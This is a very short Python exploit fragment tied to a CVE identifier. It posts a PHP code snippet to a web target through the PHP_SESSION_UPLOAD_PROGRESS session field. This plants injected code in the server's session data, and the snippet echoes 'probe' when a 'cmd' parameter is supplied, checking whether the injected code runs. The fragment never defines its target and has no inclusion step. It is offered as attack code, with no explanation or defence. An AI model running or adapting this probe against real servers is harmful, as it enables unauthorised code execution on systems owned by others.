import requests
issue = "CVE-2026-12345"
progress = "PHP_SESSION_UPLOAD_PROGRESS"
payload = "<?php if(isset($_REQUEST['cmd'])){ echo 'probe'; } ?>"
session = requests.Session()
session.post(target, data={progress: payload})
